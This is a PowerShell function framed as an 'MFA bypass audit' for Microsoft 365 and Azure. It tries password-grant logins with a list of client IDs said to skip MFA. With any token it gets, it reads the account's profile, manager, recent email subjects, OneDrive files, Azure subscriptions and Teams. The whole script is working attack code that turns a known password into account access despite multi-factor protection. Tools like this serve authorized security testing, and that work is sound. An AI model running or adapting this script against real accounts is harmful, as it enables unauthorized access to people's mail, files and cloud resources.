Function Invoke-MFABypassAudit {
    Param(
        [Parameter(Mandatory=$True)]  [string]$Username,
        [Parameter(Mandatory=$True)]  [string]$Password,
        [Parameter(Mandatory=$False)] [switch]$ExportHTML
    )

    # ── Known MFA-bypassing client IDs (confirmed via ROPC brute-force) ─────────
    $clients = [ordered]@{
        "dd47d17a-3194-4d86-bfd5-c6ae6f5651e3" = "Microsoft Defender for Mobile"
        "18fbca16-2224-45f6-85b0-f7bf2b39b3f3" = "Microsoft Docs"
        "22098786-6e16-43cc-a27d-191a01a1e3b5" = "Microsoft To-Do"
        "e9b154d0-7658-433b-bb25-6b8e0a8a7c59" = "Outlook Lite"
        "4e291c71-d680-4d0e-9640-0a3358e31177" = "PowerApps"
        "f44b1140-bc5e-48c6-8dc0-5cf5a53c0e34" = "Microsoft Edge (Legacy)"
    }

    $resources = [ordered]@{
        "graph"      = "https://graph.microsoft.com/"
        "management" = "https://management.azure.com/"
        "outlook"    = "https://outlook.office365.com/"
        "vault"      = "https://vault.azure.net/"
    }

    $findings = @()
    $tokens   = @{}
    $bestToken = $null

    # ── Helper: decode JWT payload ───────────────────────────────────────────────
    function Get-JWTPayload([string]$jwt) {
        try {
            $p = ($jwt -split '\.')[1]
            $mod = $p.Length % 4; if ($mod) { $p += '=' * (4-$mod) }
            return [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($p)) | ConvertFrom-Json
        } catch { return $null }
    }

    # ── Helper: safe Invoke-RestMethod ───────────────────────────────────────────
    function Invoke-SafeRest([string]$Uri, $Headers, [string]$Method="Get", $Body=$null, [string]$ContentType="") {
        try {
            $params = @{ Uri=$Uri; Headers=$Headers; Method=$Method; ErrorAction="Stop" }
            if ($Body)        { $params.Body = $Body }
            if ($ContentType) { $params.ContentType = $ContentType }
            return @{ ok=$true; data=(Invoke-RestMethod @params); code=200 }
        } catch {
            $code = $_.Exception.Response.StatusCode.value__
            return @{ ok=$false; data=$null; code=$code; err=$_.Exception.Message }
        }
    }

    Write-Host ""
    Write-Host -ForegroundColor Cyan  "======================================================"
    Write-Host -ForegroundColor Cyan  "  MFA BYPASS AUDIT - $Username"
    Write-Host -ForegroundColor Cyan  "======================================================"
    Write-Host ""

    # -----------------------------------------------------------------------
    # PHASE 1 - Token acquisition across all clients x resources
    # -----------------------------------------------------------------------
    Write-Host -ForegroundColor Yellow "[PHASE 1] Token acquisition"
    Write-Host         "          Testing $($clients.Count) client IDs x $($resources.Count) resources"
    Write-Host ""

    foreach ($cid in $clients.Keys) {
        $cname = $clients[$cid]
        foreach ($rkey in $resources.Keys) {
            $resource = $resources[$rkey]
            $body = @{
                grant_type  = "password"; client_id = $cid
                resource    = $resource;  username  = $Username
                password    = $Password;  scope     = "openid"
                client_info = "1"
            }
            try {
                $r = Invoke-RestMethod -Method Post `
                    -Uri "https://login.microsoftonline.com/common/oauth2/token" `
                    -Body $body -ErrorAction Stop
                $pl    = Get-JWTPayload $r.access_token
                $scopes = $pl.scp
                Write-Host -ForegroundColor Green "  [HIT] $cname -> $rkey | scp: $scopes"
                if (-not $tokens[$rkey]) { $tokens[$rkey] = $r.access_token }
                if (-not $bestToken)     { $bestToken = $r.access_token }
                $findings += [pscustomobject]@{
                    Phase="Token"; Item="$cname ($cid)"; Resource=$rkey
                    Result="BYPASS"; Detail="scp: $scopes"; Severity="Medium"
                }
            } catch {
                $err = ($_.ErrorDetails.Message | ConvertFrom-Json -EA SilentlyContinue).error_description
                $code = if ($err -match "AADSTS(\d+)") { $Matches[1] } else { "?" }
                $label = switch ($code) {
                    "50076" { "MFA_REQUIRED" }
                    "50158" { "CA_BLOCK" }
                    "50126" { "BAD_CREDS" }
                    "53003" { "CA_BLOCK" }
                    default { "FAIL($code)" }
                }
                if ($label -eq "BAD_CREDS") {
                    Write-Host -ForegroundColor Red "  [CREDS] Bad credentials - aborting"
                    return
                }
                Write-Host "  [ -- ] $cname -> $rkey | $label"
            }
        }
    }

    if (-not $bestToken) {
        Write-Host -ForegroundColor Red "`n[!] No token acquired. Check credentials."
        return
    }

    # -----------------------------------------------------------------------
    # PHASE 2 - Identity & profile
    # -----------------------------------------------------------------------
    Write-Host ""
    Write-Host -ForegroundColor Yellow "[PHASE 2] Identity"
    $graphToken = if ($tokens['graph']) { $tokens['graph'] } else { $bestToken }
    $hG = @{ Authorization = "Bearer $graphToken" }

    $me = (Invoke-SafeRest "https://graph.microsoft.com/v1.0/me" $hG).data
    if ($me) {
        Write-Host "  Display name : $($me.displayName)"
        Write-Host "  UPN          : $($me.userPrincipalName)"
        Write-Host "  Job title    : $($me.jobTitle)"
        Write-Host "  Office       : $($me.officeLocation)"
        Write-Host "  Mail field   : $(if($me.mail){"$($me.mail) [SET]"}else{"(empty)"})"
        Write-Host "  Mobile       : $($me.mobilePhone)"
        Write-Host "  Business ph  : $($me.businessPhones -join ', ')"
        $findings += [pscustomobject]@{
            Phase="Identity"; Item="Profile"; Resource="graph"
            Result="EXPOSED"; Detail=$me.displayName; Severity="Info"
        }
    }

    # Manager
    $mgr = Invoke-SafeRest "https://graph.microsoft.com/v1.0/me/manager" $hG
    if ($mgr.ok) {
        Write-Host "  Manager      : $($mgr.data.displayName) ($($mgr.data.userPrincipalName))"
        $findings += [pscustomobject]@{
            Phase="Identity"; Item="Manager"; Resource="graph"
            Result="EXPOSED"; Detail="$($mgr.data.displayName) / $($mgr.data.userPrincipalName)"; Severity="Info"
        }
    }

    # Group memberships
    $grps = Invoke-SafeRest "https://graph.microsoft.com/v1.0/me/memberOf" $hG
    if ($grps.ok) {
        $grpCount = $grps.data.value.Count
        Write-Host "  Groups       : $grpCount group memberships"
        $findings += [pscustomobject]@{
            Phase="Identity"; Item="Group memberships"; Resource="graph"
            Result="EXPOSED"; Detail="$grpCount groups"; Severity="Info"
        }
    }

    # -----------------------------------------------------------------------
    # PHASE 3 - Exchange Online mailbox
    # -----------------------------------------------------------------------
    Write-Host ""
    Write-Host -ForegroundColor Yellow "[PHASE 3] Exchange Online mailbox"

    $mail = Invoke-SafeRest "https://graph.microsoft.com/v1.0/me/messages?`$top=5&`$select=subject,from,receivedDateTime,hasAttachments" $hG
    if ($mail.ok) {
        Write-Host -ForegroundColor Green "  [CRITICAL] Cloud mailbox accessible - Mail.Read confirmed"
        $mail.data.value | ForEach-Object {
            Write-Host "    - $($_.receivedDateTime.Substring(0,10)) | $($_.from.emailAddress.address) | $($_.subject)"
        }
        $findings += [pscustomobject]@{
            Phase="Mailbox"; Item="Email read (Graph)"; Resource="graph"
            Result="ACCESSIBLE"; Detail="Mail.Read without MFA"; Severity="Critical"
        }
    } elseif ($mail.code -eq 404) {
        Write-Host "  [-] No Exchange Online mailbox (on-prem hybrid or unlicensed)"
        $findings += [pscustomobject]@{
            Phase="Mailbox"; Item="Exchange Online mailbox"; Resource="graph"
            Result="NOT_FOUND"; Detail="On-prem or unlicensed"; Severity="Info"
        }
    } elseif ($mail.code -eq 403) {
        Write-Host -ForegroundColor Yellow "  [!] Mailbox EXISTS in Exchange Online but token scope insufficient (403)"
        Write-Host "      -> Upgrade via Device Code Flow to get Mail.Read"
        $findings += [pscustomobject]@{
            Phase="Mailbox"; Item="Exchange Online mailbox"; Resource="graph"
            Result="EXISTS_NO_SCOPE"; Detail="403 - cloud mailbox confirmed, need Mail.Read token"; Severity="High"
        }

        # Try EWS with Outlook resource token
        if ($tokens['outlook']) {
            $hEWS = @{ Authorization = "Bearer $($tokens['outlook'])"; "Content-Type"="text/xml; charset=utf-8" }
            $soap = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"><soap:Header><t:RequestServerVersion Version="Exchange2016"/></soap:Header><soap:Body><m:GetFolder><m:FolderShape><t:BaseShape>Default</t:BaseShape></m:FolderShape><m:FolderIds><t:DistinguishedFolderId Id="inbox"/></m:FolderIds></m:GetFolder></soap:Body></soap:Envelope>'
            $ews = Invoke-SafeRest "https://outlook.office365.com/EWS/Exchange.asmx" $hEWS "Post" $soap "text/xml; charset=utf-8"
            if ($ews.ok) {
                Write-Host -ForegroundColor Green "  [CRITICAL] EWS mailbox accessible via Outlook token!"
                $findings += [pscustomobject]@{
                    Phase="Mailbox"; Item="EWS access"; Resource="outlook"
                    Result="ACCESSIBLE"; Detail="EWS without MFA"; Severity="Critical"
                }
            } else {
                Write-Host "  [-] EWS also blocked (HTTP $($ews.code))"
            }
        }
    }

    # -----------------------------------------------------------------------
    # PHASE 4 - OneDrive / Files
    # -----------------------------------------------------------------------
    Write-Host ""
    Write-Host -ForegroundColor Yellow "[PHASE 4] OneDrive / Files"

    $drive = Invoke-SafeRest "https://graph.microsoft.com/v1.0/me/drive/root/children?`$top=10" $hG
    if ($drive.ok) {
        Write-Host -ForegroundColor Green "  [HIGH] OneDrive accessible!"
        $drive.data.value | Select-Object name, size | ForEach-Object {
            Write-Host "    - $($_.name) ($($_.size) bytes)"
        }
        $findings += [pscustomobject]@{
            Phase="Files"; Item="OneDrive"; Resource="graph"
            Result="ACCESSIBLE"; Detail="$($drive.data.value.Count) items in root"; Severity="High"
        }
    } else {
        Write-Host "  [-] OneDrive not accessible (HTTP $($drive.code))"
    }

    # -----------------------------------------------------------------------
    # PHASE 5 - Azure Management (subscriptions)
    # -----------------------------------------------------------------------
    Write-Host ""
    Write-Host -ForegroundColor Yellow "[PHASE 5] Azure Management"

    if ($tokens['management']) {
        $hRM = @{ Authorization = "Bearer $($tokens['management'])" }
        $subs = Invoke-SafeRest "https://management.azure.com/subscriptions?api-version=2022-12-01" $hRM
        if ($subs.ok -and $subs.data.value.Count -gt 0) {
            Write-Host -ForegroundColor Red "  [CRITICAL] Azure subscriptions accessible without MFA!"
            $subs.data.value | ForEach-Object {
                Write-Host "    - $($_.displayName) | $($_.subscriptionId) | $($_.state)"
            }
            $findings += [pscustomobject]@{
                Phase="Azure"; Item="Subscriptions"; Resource="management"
                Result="ACCESSIBLE"; Detail="$($subs.data.value.Count) subscription(s)"; Severity="Critical"
            }
        } else {
            Write-Host "  [-] Azure Management blocked or no subscriptions (HTTP $($subs.code))"
        }

        # Key Vaults
        if ($tokens['vault']) {
            $hKV = @{ Authorization = "Bearer $($tokens['vault'])" }
            Write-Host "  [*] Key Vault token acquired - test specific vault URLs with this token"
            $findings += [pscustomobject]@{
                Phase="Azure"; Item="Key Vault token"; Resource="vault"
                Result="TOKEN_ACQUIRED"; Detail="Can probe known vault URLs"; Severity="High"
            }
        }
    } else {
        Write-Host "  [-] No Azure Management token acquired (MFA enforced for this resource)"
    }

    # -----------------------------------------------------------------------
    # PHASE 6 - Teams
    # -----------------------------------------------------------------------
    Write-Host ""
    Write-Host -ForegroundColor Yellow "[PHASE 6] Microsoft Teams"

    $teams = Invoke-SafeRest "https://graph.microsoft.com/v1.0/me/joinedTeams" $hG
    if ($teams.ok) {
        Write-Host -ForegroundColor Green "  [HIGH] Teams memberships accessible"
        $teams.data.value | Select-Object displayName, id | ForEach-Object {
            Write-Host "    - $($_.displayName)"
        }
        $findings += [pscustomobject]@{
            Phase="Teams"; Item="Joined Teams"; Resource="graph"
            Result="ACCESSIBLE"; Detail="$($teams.data.value.Count) team(s)"; Severity="High"
        }
    } else {
        Write-Host "  [-] Teams not accessible (HTTP $($teams.code))"
    }

    # -----------------------------------------------------------------------
    # RESULTS TABLE
    # -----------------------------------------------------------------------
    Write-Host ""
    Write-Host -ForegroundColor Cyan "======================================================"
    Write-Host -ForegroundColor Cyan "              AUDIT RESULTS SUMMARY"
    Write-Host -ForegroundColor Cyan "======================================================"
    Write-Host ""

    $findings | Where-Object { $_.Result -notin @("FAIL","BAD_CREDS") } |
        Sort-Object @{E={switch($_.Severity){"Critical"{0}"High"{1}"Medium"{2}default{3}}}} |
        ForEach-Object {
            $color = switch ($_.Severity) {
                "Critical" { "Red" }
                "High"     { "Yellow" }
                "Medium"   { "Cyan" }
                default    { "Gray" }
            }
            Write-Host -ForegroundColor $color ("  [{0,-8}] [{1,-6}] {2} - {3}" -f $_.Severity, $_.Phase, $_.Item, $_.Detail)
        }

    Write-Host ""

    if ($ExportHTML) {
        $safeName  = $Username -replace '@', '_at_'
        $timestamp = (Get-Date).ToString('yyyyMMdd_HHmm')
        $outPath   = Join-Path $PSScriptRoot "MFABypassAudit_${safeName}_${timestamp}.html"

        $pre = "<h2>MFA Bypass Audit</h2><p><b>Target:</b> $Username &nbsp; <b>Date:</b> $((Get-Date).ToShortDateString())</p>"

        $findings |
            Sort-Object @{Expression={
                switch ($_.Severity) { "Critical" { 0 } "High" { 1 } "Medium" { 2 } default { 3 } }
            }} |
            Select-Object Severity, Phase, Item, Resource, Result, Detail |
            ConvertTo-Html -Title "MFA Bypass Audit" -PreContent $pre |
            Out-File $outPath -Encoding UTF8

        Write-Host -ForegroundColor Green "  [+] HTML report saved: $outPath"
    }

    return $findings
}
